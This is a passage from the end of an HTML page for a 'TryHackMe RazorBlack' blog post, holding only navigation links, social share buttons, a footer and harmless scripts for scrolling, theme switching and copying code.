href=https://classroom.anir0y.in/tags/razorblack/>RazorBlack</a></li></ul><nav class=paginav><a class=prev href=https://classroom.anir0y.in/post/tryhackme-easyctf/><span class=title>« Prev</span><br><span>TryHackMe Simple CTF</span>
</a><a class=next href=https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/><span class=title>Next »</span><br><span>TryHackMe Linux Function Hooking</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on x" href="https://x.com/intent/tweet/?text=TryHackMe%20RazorBlack&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f&amp;hashtags=tryhackme%2crooms%2cthm%2cRazorBlack"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f&amp;title=TryHackMe%20RazorBlack&amp;summary=TryHackMe%20RazorBlack&amp;source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f&title=TryHackMe%20RazorBlack"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20RazorBlack%20-%20https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on telegram" href="https://telegram.me/share/url?text=TryHackMe%20RazorBlack&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe RazorBlack on ycombinator" href="https://news.ycombinator.com/submitlink?t=TryHackMe%20RazorBlack&u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>YOU CAN REUSE MY CONTENT</span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>